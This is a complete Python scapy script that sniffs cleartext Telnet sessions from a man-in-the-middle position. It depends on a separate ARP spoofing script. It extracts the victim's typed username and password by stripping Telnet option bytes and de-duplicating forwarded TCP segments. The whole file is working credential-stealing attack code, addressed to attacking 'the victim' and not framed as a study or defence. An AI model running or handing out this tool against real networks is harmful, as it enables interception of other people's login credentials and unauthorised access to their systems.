#!/usr/bin/env python3
"""
telnet_sniff.py -- watch a cleartext Telnet session and print what the client
types (username + password) while we are man-in-the-middle for it.

Prereqs:
  * MITM is up:  sudo python3 arp_spoof.py <client> <server>
  * The victim opens `telnet <server>` and logs in.

How it works:
  Telnet is unencrypted and sends the client's keystrokes to the server on
  TCP port 23. We sniff only the client -> server direction (dport 23), strip
  the Telnet IAC option-negotiation bytes, buffer the printable characters per
  connection, and print one clean line each time the victim presses Enter. The
  server does NOT echo the password, but the CLIENT still transmits it in the
  clear -- so watching client -> server reveals it anyway.

  Because we run on the MITM host, each keystroke segment crosses our interface
  twice (once received from the client, once re-sent to the server by IP
  forwarding), and TCP may also retransmit. We de-duplicate on the TCP sequence
  number so every character is shown exactly once.

Usage:
  sudo python3 telnet_sniff.py -i eth0                     # all telnet clients
  sudo python3 telnet_sniff.py -i eth0 --server 10.0.0.5   # one server only
"""
from scapy.all import IP, TCP, Raw, sniff
import argparse

IAC = 0xFF   # Telnet "Interpret As Command" escape byte


def build_args():
    p = argparse.ArgumentParser(description="Cleartext Telnet keystroke sniffer")
    p.add_argument("-i", "--iface", required=True, help="Interface to sniff on")
    p.add_argument("--server", default=None,
                   help="Only show sessions to this server IP (optional)")
    return p.parse_args()


def strip_telnet(data):
    """Remove Telnet IAC negotiation sequences, keep the human-typed bytes."""
    out = bytearray()
    i = 0
    while i < len(data):
        b = data[i]
        if b == IAC:
            # IAC SB ... IAC SE  (variable-length sub-negotiation)
            if i + 1 < len(data) and data[i + 1] == 0xFA:
                i += 2
                while i < len(data) and data[i] != 0xF0:  # 0xF0 == SE
                    i += 1
                i += 1
                continue
            # IAC <command> <option>  (3-byte WILL/WONT/DO/DONT etc.)
            i += 3
            continue
        out.append(b)
        i += 1
    return bytes(out)


def make_handler(server):
    lines = {}       # (ip, port) -> the line currently being typed
    next_seq = {}    # (ip, port) -> next expected TCP seq, to drop duplicates

    def process(pkt):
        # client -> server keystrokes only
        if not (pkt.haslayer(TCP) and pkt[TCP].dport == 23 and pkt.haslayer(Raw)):
            return
        if server and pkt[IP].dst != server:
            return

        key = (pkt[IP].src, pkt[TCP].sport)
        seq = pkt[TCP].seq
        raw = bytes(pkt[Raw].load)

        # On the MITM host each segment appears twice (received + forwarded),
        # and TCP may retransmit. Anything at or below what we've already
        # consumed is a duplicate -- skip it so each keystroke prints once.
        exp = next_seq.get(key)
        if exp is not None and seq < exp:
            return
        next_seq[key] = seq + len(raw)

        buf = lines.get(key, "")
        for c in strip_telnet(raw):
            if c in (10, 13):                 # Enter -> the line is complete
                if buf:
                    print("[{}:{}]  {}".format(pkt[IP].src, pkt[TCP].sport, buf),
                          flush=True)
                buf = ""
            elif 32 <= c < 127:               # printable -> keep it
                buf += chr(c)
            # everything else (NUL, other control bytes) is ignored
        lines[key] = buf

    return process


def main():
    a = build_args()
    print("[*] Sniffing Telnet keystrokes on {} (Ctrl+C to stop)".format(a.iface))
    print("[*] Each line is one thing the victim pressed Enter on "
          "-- typically the login, then the password:\n")
    sniff(iface=a.iface, store=False, prn=make_handler(a.server),
          filter="tcp port 23")


if __name__ == "__main__":
    main()
